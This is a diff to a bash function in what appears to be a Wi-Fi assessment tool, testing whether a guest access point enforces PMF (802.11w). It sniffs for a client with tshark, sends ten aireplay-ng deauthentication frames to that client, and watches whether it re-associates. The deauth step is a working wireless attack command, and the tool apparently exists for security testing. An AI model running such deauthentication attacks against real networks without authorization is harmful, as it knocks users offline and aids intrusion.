@@ -23,8 +23,27 @@
 
 run_h2() {
     set -uo pipefail
+
+    local mon_iface="${MONITOR_INTERFACE:-}"
+    local target_ssid="${GUEST_SSID:-}"
+    local target_bssid="${GUEST_BSSID:-}"
+    local target_channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --monitor-interface) mon_iface="$2"; shift 2 ;;
+            --target-ssid) target_ssid="$2"; shift 2 ;;
+            --target-bssid) target_bssid="$2"; shift 2 ;;
+            --target-channel) target_channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
     local total_steps=5
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/h2"
+    local evidence_prefix="${evidence_dir}/h2"
     
     log_step 1 $total_steps "Detecting PMF Support"
     update_tc_progress 1 $total_steps "Detection"
@@ -33,32 +52,46 @@ run_h2() {
 
     check_abort || return 1
 
-    if [[ -z "${GUEST_SSID:-}" ]]; then
-        log_error "Target SSID not set. Run A1 first."; return 1
+    if [[ -z "$target_ssid" || -z "$target_bssid" ]]; then
+        log_error "Target SSID/BSSID not set. Run A1 first."; return 1
     fi
 
-    # Check scan results for RSN PMF flags
+    # Check scan results for RSN PMF flags via Assessment Engine
     local pmf_supported="false"
-    if has_tc_results "A1"; then
-        local a1_data=$(load_tc_result "A1")
-        if echo "$a1_data" | grep -qi "PMF"; then
+    if [[ -n "${ENGINE_SOCKET:-}" && -S "$ENGINE_SOCKET" ]]; then
+        local networks_json
+        networks_json=$(run_engine_api GET "/v1/networks" 2>/dev/null || echo "[]")
+        
+        # We can extract the PMF status if we parse encryption or if A1 captured it,
+        # but realistically we just check if it's in the network list output.
+        # As a simplified check matching original logic:
+        if echo "$networks_json" | run_fg jq -r ".[] | select(.bssid == \"$target_bssid\") | .encryption" | grep -qi "WPA3\|PMF"; then
             pmf_supported="true"
-            log_info "PMF (802.11w) detected in AP beacon RSN info."
+            log_info "PMF (802.11w) implicitly detected or WPA3 in use."
         fi
     fi
 
     log_step 2 $total_steps "Enabling Monitor Mode"
-    enable_monitor_mode || return 1
-    local mon_iface="${MONITOR_INTERFACE}"
+    if [[ -z "$mon_iface" ]]; then
+        enable_monitor_mode || return 1
+        mon_iface="${MONITOR_INTERFACE}"
+    fi
+
+    # Set channel
+    if [[ -n "$target_channel" ]]; then
+        run_fg --quiet iw dev "$mon_iface" set channel "$target_channel" || true
+    fi
 
     check_abort || return 1
 
     log_step 3 $total_steps "Selecting Target Client"
     # Try to find an active client on the target AP
-    local target_client=$(run_as_user tshark -i "$mon_iface" -a duration:10 -Y "wlan.bssid == ${GUEST_BSSID}" -T fields -e wlan.sa 2>/dev/null | sort | uniq | head -1)
+    log_info "Listening for clients on ${target_bssid}..."
+    local target_client
+    target_client=$(run_as_user tshark -i "$mon_iface" -a duration:10 -Y "wlan.bssid == ${target_bssid}" -T fields -e wlan.sa 2>/dev/null | sort | uniq | head -1)
     
     if [[ -z "$target_client" ]]; then
-        log_warn "No active clients detected on ${GUEST_SSID}. Cannot test PMF enforcement."
+        log_warn "No active clients detected on ${target_ssid}. Cannot test PMF enforcement."
         return 1
     fi
     log_info "Target Client: ${target_client}"
@@ -72,11 +105,12 @@ run_h2() {
     log_info "Sending 10 deauth frames to ${target_client}..."
     
     # Send deauths
-    run_fg "aireplay-ng" --deauth 10 -a "${GUEST_BSSID}" -c "${target_client}" "${mon_iface}" > "$log_file" 2>&1
+    run_fg aireplay-ng --deauth 10 -a "${target_bssid}" -c "${target_client}" "${mon_iface}" > "$log_file" 2>&1
     
     # Check if client reconnects immediately (indicator of success)
     log_info "Monitoring for client re-association..."
-    local reauth=$(timeout 15 run_as_user tshark -i "$mon_iface" -Y "wlan.fc.type_subtype == 0x00 and wlan.addr == ${target_client}" -c 1 2>/dev/null)
+    local reauth
+    reauth=$(timeout 15 run_as_user tshark -i "$mon_iface" -Y "wlan.fc.type_subtype == 0x00 and wlan.addr == ${target_client}" -c 1 2>/dev/null) || true
     
     local vulnerability="SECURE"
     if [[ -n "$reauth" ]]; then
@@ -87,10 +121,10 @@ run_h2() {
     fi
 
     log_step 5 $total_steps "Saving Results"
-    local result_json=$(run_tool jq -n \
+    local result_json=$(run_fg jq -n \
         --arg status "$vulnerability" \
         --arg summary "PMF Enforcement: ${vulnerability}" \
-        --arg details "AP: ${GUEST_BSSID}, Client: ${target_client}" \
+        --arg details "AP: ${target_bssid}, Client: ${target_client}" \
         '{
             status: $status,
             summary: $summary,
